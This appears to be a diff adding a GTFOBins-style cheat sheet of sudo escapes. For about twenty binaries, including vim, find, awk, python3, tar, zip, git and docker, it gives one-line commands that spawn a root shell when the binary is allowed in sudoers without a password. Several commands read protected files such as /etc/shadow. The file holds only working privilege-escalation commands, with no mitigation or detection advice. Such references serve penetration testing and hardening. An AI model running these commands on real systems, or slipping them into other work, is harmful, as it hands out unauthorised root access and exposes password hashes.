@@ -1,0 +1,70 @@
+# GTFOBins-style Sudo Escapes
+# Quick reference for binaries commonly found in sudoers with NOPASSWD
+
+## vim
+sudo vim -c ':!/bin/sh'
+
+## less
+sudo less /etc/hosts
+# then: !/bin/sh
+
+## more
+sudo more /etc/hosts
+# then: !/bin/sh
+
+## man
+sudo man man
+# then: !/bin/sh
+
+## find
+sudo find . -exec /bin/sh \; -quit
+
+## awk
+sudo awk 'BEGIN {system("/bin/sh")}'
+
+## python3
+sudo python3 -c 'import os; os.system("/bin/sh")'
+
+## perl
+sudo perl -e 'exec "/bin/sh"'
+
+## ruby
+sudo ruby -e 'exec "/bin/sh"'
+
+## php
+sudo php -r 'system("/bin/sh");'
+
+## git
+sudo git -p help config
+# then: !/bin/sh
+# OR
+sudo git branch --help
+# then: !/bin/sh
+
+## docker
+sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+## mysql
+sudo mysql -e '! /bin/sh'
+
+## nmap (interactive, old versions)
+sudo nmap --interactive
+# then: !sh
+
+## tar
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+## zip
+sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"
+
+## arp
+sudo arp -v -f /etc/passwd
+# arp reads arbitrary file, use for info leak
+
+## base64
+sudo base64 /etc/shadow | base64 --decode
+# read arbitrary file
+
+## cat
+sudo cat /etc/shadow
+# read arbitrary file
